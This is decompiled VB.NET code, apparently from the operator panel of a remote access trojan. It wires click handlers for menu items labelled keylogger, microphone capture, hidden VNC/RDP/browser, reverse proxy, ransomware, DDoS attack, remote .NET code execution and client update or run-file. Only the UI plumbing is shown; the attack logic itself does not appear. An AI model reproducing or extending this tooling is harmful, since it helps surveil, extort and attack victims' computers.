				Dim value2 As EventHandler = AddressOf Me.ActiveWindowsContex_Click
				Dim activeWindowsContex As ToolStripMenuItem = Me._ActiveWindowsContex
				If activeWindowsContex IsNot Nothing Then
					RemoveHandler activeWindowsContex.Click, value2
				End If
				Me._ActiveWindowsContex = value
				activeWindowsContex = Me._ActiveWindowsContex
				If activeWindowsContex IsNot Nothing Then
					AddHandler activeWindowsContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000541 RID: 1345
		' (get) Token: 0x06000C69 RID: 3177 RVA: 0x0006FAA3 File Offset: 0x0006DCA3
		' (set) Token: 0x06000C6A RID: 3178 RVA: 0x0006FAB0 File Offset: 0x0006DCB0
		Friend Overridable Property MonitorWatcherContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._MonitorWatcherContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MonitorWatcherContex_Click
				Dim monitorWatcherContex As ToolStripMenuItem = Me._MonitorWatcherContex
				If monitorWatcherContex IsNot Nothing Then
					RemoveHandler monitorWatcherContex.Click, value2
				End If
				Me._MonitorWatcherContex = value
				monitorWatcherContex = Me._MonitorWatcherContex
				If monitorWatcherContex IsNot Nothing Then
					AddHandler monitorWatcherContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000542 RID: 1346
		' (get) Token: 0x06000C6B RID: 3179 RVA: 0x0006FAF3 File Offset: 0x0006DCF3
		' (set) Token: 0x06000C6C RID: 3180 RVA: 0x0006FB00 File Offset: 0x0006DD00
		Friend Overridable Property KeyloggerContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KeyloggerContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KeyloggerContex_Click
				Dim keyloggerContex As ToolStripMenuItem = Me._KeyloggerContex
				If keyloggerContex IsNot Nothing Then
					RemoveHandler keyloggerContex.Click, value2
				End If
				Me._KeyloggerContex = value
				keyloggerContex = Me._KeyloggerContex
				If keyloggerContex IsNot Nothing Then
					AddHandler keyloggerContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000543 RID: 1347
		' (get) Token: 0x06000C6D RID: 3181 RVA: 0x0006FB43 File Offset: 0x0006DD43
		' (set) Token: 0x06000C6E RID: 3182 RVA: 0x0006FB50 File Offset: 0x0006DD50
		Friend Overridable Property MicrophoneContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._MicrophoneContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MicrophoneContex_Click
				Dim microphoneContex As ToolStripMenuItem = Me._MicrophoneContex
				If microphoneContex IsNot Nothing Then
					RemoveHandler microphoneContex.Click, value2
				End If
				Me._MicrophoneContex = value
				microphoneContex = Me._MicrophoneContex
				If microphoneContex IsNot Nothing Then
					AddHandler microphoneContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000544 RID: 1348
		' (get) Token: 0x06000C6F RID: 3183 RVA: 0x0006FB93 File Offset: 0x0006DD93
		' (set) Token: 0x06000C70 RID: 3184 RVA: 0x0006FB9D File Offset: 0x0006DD9D
		Friend Overridable Property HelpRemoteHiddenContex As Guna2ContextMenuStrip

		' Token: 0x17000545 RID: 1349
		' (get) Token: 0x06000C71 RID: 3185 RVA: 0x0006FBA6 File Offset: 0x0006DDA6
		' (set) Token: 0x06000C72 RID: 3186 RVA: 0x0006FBB0 File Offset: 0x0006DDB0
		Friend Overridable Property HiddenAppliactionsContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._HiddenAppliactionsContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.HiddenAppliactionsContex_Click
				Dim hiddenAppliactionsContex As ToolStripMenuItem = Me._HiddenAppliactionsContex
				If hiddenAppliactionsContex IsNot Nothing Then
					RemoveHandler hiddenAppliactionsContex.Click, value2
				End If
				Me._HiddenAppliactionsContex = value
				hiddenAppliactionsContex = Me._HiddenAppliactionsContex
				If hiddenAppliactionsContex IsNot Nothing Then
					AddHandler hiddenAppliactionsContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000546 RID: 1350
		' (get) Token: 0x06000C73 RID: 3187 RVA: 0x0006FBF3 File Offset: 0x0006DDF3
		' (set) Token: 0x06000C74 RID: 3188 RVA: 0x0006FC00 File Offset: 0x0006DE00
		Friend Overridable Property HiddenBrowserContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._HiddenBrowserContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.HiddenBrowserContex_Click
				Dim hiddenBrowserContex As ToolStripMenuItem = Me._HiddenBrowserContex
				If hiddenBrowserContex IsNot Nothing Then
					RemoveHandler hiddenBrowserContex.Click, value2
				End If
				Me._HiddenBrowserContex = value
				hiddenBrowserContex = Me._HiddenBrowserContex
				If hiddenBrowserContex IsNot Nothing Then
					AddHandler hiddenBrowserContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000547 RID: 1351
		' (get) Token: 0x06000C75 RID: 3189 RVA: 0x0006FC43 File Offset: 0x0006DE43
		' (set) Token: 0x06000C76 RID: 3190 RVA: 0x0006FC50 File Offset: 0x0006DE50
		Friend Overridable Property HiddenVNCContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._HiddenVNCContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.HiddenVNCContex_Click
				Dim hiddenVNCContex As ToolStripMenuItem = Me._HiddenVNCContex
				If hiddenVNCContex IsNot Nothing Then
					RemoveHandler hiddenVNCContex.Click, value2
				End If
				Me._HiddenVNCContex = value
				hiddenVNCContex = Me._HiddenVNCContex
				If hiddenVNCContex IsNot Nothing Then
					AddHandler hiddenVNCContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000548 RID: 1352
		' (get) Token: 0x06000C77 RID: 3191 RVA: 0x0006FC93 File Offset: 0x0006DE93
		' (set) Token: 0x06000C78 RID: 3192 RVA: 0x0006FCA0 File Offset: 0x0006DEA0
		Friend Overridable Property HiddenRDPContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._HiddenRDPContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.HiddenRDPContex_Click
				Dim hiddenRDPContex As ToolStripMenuItem = Me._HiddenRDPContex
				If hiddenRDPContex IsNot Nothing Then
					RemoveHandler hiddenRDPContex.Click, value2
				End If
				Me._HiddenRDPContex = value
				hiddenRDPContex = Me._HiddenRDPContex
				If hiddenRDPContex IsNot Nothing Then
					AddHandler hiddenRDPContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000549 RID: 1353
		' (get) Token: 0x06000C79 RID: 3193 RVA: 0x0006FCE3 File Offset: 0x0006DEE3
		' (set) Token: 0x06000C7A RID: 3194 RVA: 0x0006FCED File Offset: 0x0006DEED
		Friend Overridable Property HelpNetworkContex As Guna2ContextMenuStrip

		' Token: 0x1700054A RID: 1354
		' (get) Token: 0x06000C7B RID: 3195 RVA: 0x0006FCF6 File Offset: 0x0006DEF6
		' (set) Token: 0x06000C7C RID: 3196 RVA: 0x0006FD00 File Offset: 0x0006DF00
		Friend Overridable Property ReverseProxyContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ReverseProxyContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ReverseProxyContex_Click
				Dim reverseProxyContex As ToolStripMenuItem = Me._ReverseProxyContex
				If reverseProxyContex IsNot Nothing Then
					RemoveHandler reverseProxyContex.Click, value2
				End If
				Me._ReverseProxyContex = value
				reverseProxyContex = Me._ReverseProxyContex
				If reverseProxyContex IsNot Nothing Then
					AddHandler reverseProxyContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700054B RID: 1355
		' (get) Token: 0x06000C7D RID: 3197 RVA: 0x0006FD43 File Offset: 0x0006DF43
		' (set) Token: 0x06000C7E RID: 3198 RVA: 0x0006FD50 File Offset: 0x0006DF50
		Friend Overridable Property ConnectionContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ConnectionContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ConnectionContex_Click
				Dim connectionContex As ToolStripMenuItem = Me._ConnectionContex
				If connectionContex IsNot Nothing Then
					RemoveHandler connectionContex.Click, value2
				End If
				Me._ConnectionContex = value
				connectionContex = Me._ConnectionContex
				If connectionContex IsNot Nothing Then
					AddHandler connectionContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700054C RID: 1356
		' (get) Token: 0x06000C7F RID: 3199 RVA: 0x0006FD93 File Offset: 0x0006DF93
		' (set) Token: 0x06000C80 RID: 3200 RVA: 0x0006FDA0 File Offset: 0x0006DFA0
		Friend Overridable Property HostsEditorContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._HostsEditorContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.HostsEditorContex_Click
				Dim hostsEditorContex As ToolStripMenuItem = Me._HostsEditorContex
				If hostsEditorContex IsNot Nothing Then
					RemoveHandler hostsEditorContex.Click, value2
				End If
				Me._HostsEditorContex = value
				hostsEditorContex = Me._HostsEditorContex
				If hostsEditorContex IsNot Nothing Then
					AddHandler hostsEditorContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700054D RID: 1357
		' (get) Token: 0x06000C81 RID: 3201 RVA: 0x0006FDE3 File Offset: 0x0006DFE3
		' (set) Token: 0x06000C82 RID: 3202 RVA: 0x0006FDF0 File Offset: 0x0006DFF0
		Friend Overridable Property ClipboardContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ClipboardContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ClipboardContex_Click
				Dim clipboardContex As ToolStripMenuItem = Me._ClipboardContex
				If clipboardContex IsNot Nothing Then
					RemoveHandler clipboardContex.Click, value2
				End If
				Me._ClipboardContex = value
				clipboardContex = Me._ClipboardContex
				If clipboardContex IsNot Nothing Then
					AddHandler clipboardContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700054E RID: 1358
		' (get) Token: 0x06000C83 RID: 3203 RVA: 0x0006FE33 File Offset: 0x0006E033
		' (set) Token: 0x06000C84 RID: 3204 RVA: 0x0006FE40 File Offset: 0x0006E040
		Friend Overridable Property RansomwareContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RansomwareContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RansomwareContex_Click
				Dim ransomwareContex As ToolStripMenuItem = Me._RansomwareContex
				If ransomwareContex IsNot Nothing Then
					RemoveHandler ransomwareContex.Click, value2
				End If
				Me._RansomwareContex = value
				ransomwareContex = Me._RansomwareContex
				If ransomwareContex IsNot Nothing Then
					AddHandler ransomwareContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700054F RID: 1359
		' (get) Token: 0x06000C85 RID: 3205 RVA: 0x0006FE83 File Offset: 0x0006E083
		' (set) Token: 0x06000C86 RID: 3206 RVA: 0x0006FE90 File Offset: 0x0006E090
		Friend Overridable Property AntiMalwareContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._AntiMalwareContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.AntiMalwareContex_Click
				Dim antiMalwareContex As ToolStripMenuItem = Me._AntiMalwareContex
				If antiMalwareContex IsNot Nothing Then
					RemoveHandler antiMalwareContex.Click, value2
				End If
				Me._AntiMalwareContex = value
				antiMalwareContex = Me._AntiMalwareContex
				If antiMalwareContex IsNot Nothing Then
					AddHandler antiMalwareContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000550 RID: 1360
		' (get) Token: 0x06000C87 RID: 3207 RVA: 0x0006FED3 File Offset: 0x0006E0D3
		' (set) Token: 0x06000C88 RID: 3208 RVA: 0x0006FEE0 File Offset: 0x0006E0E0
		Friend Overridable Property ExecuteNETCodeContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ExecuteNETCodeContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExecuteNETCodeContex_Click
				Dim executeNETCodeContex As ToolStripMenuItem = Me._ExecuteNETCodeContex
				If executeNETCodeContex IsNot Nothing Then
					RemoveHandler executeNETCodeContex.Click, value2
				End If
				Me._ExecuteNETCodeContex = value
				executeNETCodeContex = Me._ExecuteNETCodeContex
				If executeNETCodeContex IsNot Nothing Then
					AddHandler executeNETCodeContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000551 RID: 1361
		' (get) Token: 0x06000C89 RID: 3209 RVA: 0x0006FF23 File Offset: 0x0006E123
		' (set) Token: 0x06000C8A RID: 3210 RVA: 0x0006FF30 File Offset: 0x0006E130
		Friend Overridable Property MessageBoxContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._MessageBoxContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MessageBoxContex_Click
				Dim messageBoxContex As ToolStripMenuItem = Me._MessageBoxContex
				If messageBoxContex IsNot Nothing Then
					RemoveHandler messageBoxContex.Click, value2
				End If
				Me._MessageBoxContex = value
				messageBoxContex = Me._MessageBoxContex
				If messageBoxContex IsNot Nothing Then
					AddHandler messageBoxContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000552 RID: 1362
		' (get) Token: 0x06000C8B RID: 3211 RVA: 0x0006FF73 File Offset: 0x0006E173
		' (set) Token: 0x06000C8C RID: 3212 RVA: 0x0006FF80 File Offset: 0x0006E180
		Friend Overridable Property DDosAttackContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._DDosAttackContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DDosAttackContex_Click
				Dim ddosAttackContex As ToolStripMenuItem = Me._DDosAttackContex
				If ddosAttackContex IsNot Nothing Then
					RemoveHandler ddosAttackContex.Click, value2
				End If
				Me._DDosAttackContex = value
				ddosAttackContex = Me._DDosAttackContex
				If ddosAttackContex IsNot Nothing Then
					AddHandler ddosAttackContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000553 RID: 1363
		' (get) Token: 0x06000C8D RID: 3213 RVA: 0x0006FFC3 File Offset: 0x0006E1C3
		' (set) Token: 0x06000C8E RID: 3214 RVA: 0x0006FFD0 File Offset: 0x0006E1D0
		Friend Overridable Property OptionsContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._OptionsContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OptionsContex_Click
				Dim optionsContex As ToolStripMenuItem = Me._OptionsContex
				If optionsContex IsNot Nothing Then
					RemoveHandler optionsContex.Click, value2
				End If
				Me._OptionsContex = value
				optionsContex = Me._OptionsContex
				If optionsContex IsNot Nothing Then
					AddHandler optionsContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000554 RID: 1364
		' (get) Token: 0x06000C8F RID: 3215 RVA: 0x00070013 File Offset: 0x0006E213
		' (set) Token: 0x06000C90 RID: 3216 RVA: 0x00070020 File Offset: 0x0006E220
		Friend Overridable Property FunContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FunContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FunContex_Click
				Dim funContex As ToolStripMenuItem = Me._FunContex
				If funContex IsNot Nothing Then
					RemoveHandler funContex.Click, value2
				End If
				Me._FunContex = value
				funContex = Me._FunContex
				If funContex IsNot Nothing Then
					AddHandler funContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000555 RID: 1365
		' (get) Token: 0x06000C91 RID: 3217 RVA: 0x00070063 File Offset: 0x0006E263
		' (set) Token: 0x06000C92 RID: 3218 RVA: 0x00070070 File Offset: 0x0006E270
		Friend Overridable Property ClientContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ClientContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ClientContex_Click
				Dim clientContex As ToolStripMenuItem = Me._ClientContex
				If clientContex IsNot Nothing Then
					RemoveHandler clientContex.Click, value2
				End If
				Me._ClientContex = value
				clientContex = Me._ClientContex
				If clientContex IsNot Nothing Then
					AddHandler clientContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000556 RID: 1366
		' (get) Token: 0x06000C93 RID: 3219 RVA: 0x000700B3 File Offset: 0x0006E2B3
		' (set) Token: 0x06000C94 RID: 3220 RVA: 0x000700C0 File Offset: 0x0006E2C0
		Friend Overridable Property ToolStripMenuItem34 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem34
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem34_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem34
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem34 = value
				toolStripMenuItem = Me._ToolStripMenuItem34
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000557 RID: 1367
		' (get) Token: 0x06000C95 RID: 3221 RVA: 0x00070103 File Offset: 0x0006E303
		' (set) Token: 0x06000C96 RID: 3222 RVA: 0x0007010D File Offset: 0x0006E30D
		Friend Overridable Property Guna2Elipse27 As Guna2Elipse

		' Token: 0x17000558 RID: 1368
		' (get) Token: 0x06000C97 RID: 3223 RVA: 0x00070116 File Offset: 0x0006E316
		' (set) Token: 0x06000C98 RID: 3224 RVA: 0x00070120 File Offset: 0x0006E320
		Friend Overridable Property Guna2Elipse28 As Guna2Elipse

		' Token: 0x17000559 RID: 1369
		' (get) Token: 0x06000C99 RID: 3225 RVA: 0x00070129 File Offset: 0x0006E329
		' (set) Token: 0x06000C9A RID: 3226 RVA: 0x00070133 File Offset: 0x0006E333
		Friend Overridable Property Guna2Elipse29 As Guna2Elipse

		' Token: 0x1700055A RID: 1370
		' (get) Token: 0x06000C9B RID: 3227 RVA: 0x0007013C File Offset: 0x0006E33C
		' (set) Token: 0x06000C9C RID: 3228 RVA: 0x00070148 File Offset: 0x0006E348
		Friend Overridable Property ChatContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ChatContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ChatContex_Click
				Dim chatContex As ToolStripMenuItem = Me._ChatContex
				If chatContex IsNot Nothing Then
					RemoveHandler chatContex.Click, value2
				End If
				Me._ChatContex = value
				chatContex = Me._ChatContex
				If chatContex IsNot Nothing Then
					AddHandler chatContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700055B RID: 1371
		' (get) Token: 0x06000C9D RID: 3229 RVA: 0x0007018B File Offset: 0x0006E38B
		' (set) Token: 0x06000C9E RID: 3230 RVA: 0x00070198 File Offset: 0x0006E398
		Friend Overridable Property WIFIContexx As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._WIFIContexx
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.WIFIContexx_Click
				Dim wificontexx As ToolStripMenuItem = Me._WIFIContexx
				If wificontexx IsNot Nothing Then
					RemoveHandler wificontexx.Click, value2
				End If
				Me._WIFIContexx = value
				wificontexx = Me._WIFIContexx
				If wificontexx IsNot Nothing Then
					AddHandler wificontexx.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700055C RID: 1372
		' (get) Token: 0x06000C9F RID: 3231 RVA: 0x000701DB File Offset: 0x0006E3DB
		' (set) Token: 0x06000CA0 RID: 3232 RVA: 0x000701E5 File Offset: 0x0006E3E5
		Friend Overridable Property HelpClientContex As Guna2ContextMenuStrip

		' Token: 0x1700055D RID: 1373
		' (get) Token: 0x06000CA1 RID: 3233 RVA: 0x000701EE File Offset: 0x0006E3EE
		' (set) Token: 0x06000CA2 RID: 3234 RVA: 0x000701F8 File Offset: 0x0006E3F8
		Friend Overridable Property UpdateClient As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UpdateClient
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UpdateClient_Click
				Dim updateClient As ToolStripMenuItem = Me._UpdateClient
				If updateClient IsNot Nothing Then
					RemoveHandler updateClient.Click, value2
				End If
				Me._UpdateClient = value
				updateClient = Me._UpdateClient
				If updateClient IsNot Nothing Then
					AddHandler updateClient.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700055E RID: 1374
		' (get) Token: 0x06000CA3 RID: 3235 RVA: 0x0007023B File Offset: 0x0006E43B
		' (set) Token: 0x06000CA4 RID: 3236 RVA: 0x00070248 File Offset: 0x0006E448
		Friend Overridable Property Unistall As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._Unistall
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.Unistall_Click
				Dim unistall As ToolStripMenuItem = Me._Unistall
				If unistall IsNot Nothing Then
					RemoveHandler unistall.Click, value2
				End If
				Me._Unistall = value
				unistall = Me._Unistall
				If unistall IsNot Nothing Then
					AddHandler unistall.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700055F RID: 1375
		' (get) Token: 0x06000CA5 RID: 3237 RVA: 0x0007028B File Offset: 0x0006E48B
		' (set) Token: 0x06000CA6 RID: 3238 RVA: 0x00070298 File Offset: 0x0006E498
		Friend Overridable Property CloseClient As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CloseClient
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CloseClient_Click
				Dim closeClient As ToolStripMenuItem = Me._CloseClient
				If closeClient IsNot Nothing Then
					RemoveHandler closeClient.Click, value2
				End If
				Me._CloseClient = value
				closeClient = Me._CloseClient
				If closeClient IsNot Nothing Then
					AddHandler closeClient.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000560 RID: 1376
		' (get) Token: 0x06000CA7 RID: 3239 RVA: 0x000702DB File Offset: 0x0006E4DB
		' (set) Token: 0x06000CA8 RID: 3240 RVA: 0x000702E8 File Offset: 0x0006E4E8
		Friend Overridable Property RenameClient As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RenameClient
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameClient_Click
				Dim renameClient As ToolStripMenuItem = Me._RenameClient
				If renameClient IsNot Nothing Then
					RemoveHandler renameClient.Click, value2
				End If
				Me._RenameClient = value
				renameClient = Me._RenameClient
				If renameClient IsNot Nothing Then
					AddHandler renameClient.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000561 RID: 1377
		' (get) Token: 0x06000CA9 RID: 3241 RVA: 0x0007032B File Offset: 0x0006E52B
		' (set) Token: 0x06000CAA RID: 3242 RVA: 0x00070338 File Offset: 0x0006E538
		Friend Overridable Property SupportClient As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._SupportClient
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SupportClient_Click
				Dim supportClient As ToolStripMenuItem = Me._SupportClient
				If supportClient IsNot Nothing Then
					RemoveHandler supportClient.Click, value2
				End If
				Me._SupportClient = value
				supportClient = Me._SupportClient
				If supportClient IsNot Nothing Then
					AddHandler supportClient.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000562 RID: 1378
		' (get) Token: 0x06000CAB RID: 3243 RVA: 0x0007037B File Offset: 0x0006E57B
		' (set) Token: 0x06000CAC RID: 3244 RVA: 0x00070385 File Offset: 0x0006E585
		Friend Overridable Property Guna2Elipse30 As Guna2Elipse

		' Token: 0x17000563 RID: 1379
		' (get) Token: 0x06000CAD RID: 3245 RVA: 0x0007038E File Offset: 0x0006E58E
		' (set) Token: 0x06000CAE RID: 3246 RVA: 0x00070398 File Offset: 0x0006E598
		Friend Overridable Property RestartClient As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RestartClient
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartClient_Click
				Dim restartClient As ToolStripMenuItem = Me._RestartClient
				If restartClient IsNot Nothing Then
					RemoveHandler restartClient.Click, value2
				End If
				Me._RestartClient = value
				restartClient = Me._RestartClient
				If restartClient IsNot Nothing Then
					AddHandler restartClient.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000564 RID: 1380
		' (get) Token: 0x06000CAF RID: 3247 RVA: 0x000703DB File Offset: 0x0006E5DB
		' (set) Token: 0x06000CB0 RID: 3248 RVA: 0x000703E8 File Offset: 0x0006E5E8
		Friend Overridable Property RunFileClient As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RunFileClient
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RunFileClient_Click
				Dim runFileClient As ToolStripMenuItem = Me._RunFileClient
				If runFileClient IsNot Nothing Then
					RemoveHandler runFileClient.Click, value2
				End If
				Me._RunFileClient = value
				runFileClient = Me._RunFileClient
				If runFileClient IsNot Nothing Then
					AddHandler runFileClient.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000565 RID: 1381
		' (get) Token: 0x06000CB1 RID: 3249 RVA: 0x0007042B File Offset: 0x0006E62B
		' (set) Token: 0x06000CB2 RID: 3250 RVA: 0x00070435 File Offset: 0x0006E635
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x17000566 RID: 1382
		' (get) Token: 0x06000CB3 RID: 3251 RVA: 0x0007043E File Offset: 0x0006E63E
		' (set) Token: 0x06000CB4 RID: 3252 RVA: 0x00070448 File Offset: 0x0006E648
		Friend Overridable Property Column8 As DataGridViewTextBoxColumn

		' Token: 0x17000567 RID: 1383
		' (get) Token: 0x06000CB5 RID: 3253 RVA: 0x00070451 File Offset: 0x0006E651
		' (set) Token: 0x06000CB6 RID: 3254 RVA: 0x0007045B File Offset: 0x0006E65B
		Friend Overridable Property Column9 As DataGridViewTextBoxColumn

		' Token: 0x17000568 RID: 1384
		' (get) Token: 0x06000CB7 RID: 3255 RVA: 0x00070464 File Offset: 0x0006E664
		' (set) Token: 0x06000CB8 RID: 3256 RVA: 0x0007046E File Offset: 0x0006E66E
		Friend Overridable Property Column10 As DataGridViewTextBoxColumn

		' Token: 0x17000569 RID: 1385
		' (get) Token: 0x06000CB9 RID: 3257 RVA: 0x00070477 File Offset: 0x0006E677
		' (set) Token: 0x06000CBA RID: 3258 RVA: 0x00070481 File Offset: 0x0006E681
		Friend Overridable Property Column11 As DataGridViewTextBoxColumn

		' Token: 0x1700056A RID: 1386
		' (get) Token: 0x06000CBB RID: 3259 RVA: 0x0007048A File Offset: 0x0006E68A
		' (set) Token: 0x06000CBC RID: 3260 RVA: 0x00070494 File Offset: 0x0006E694
		Friend Overridable Property Column12 As DataGridViewImageColumn

		' Token: 0x1700056B RID: 1387
		' (get) Token: 0x06000CBD RID: 3261 RVA: 0x0007049D File Offset: 0x0006E69D
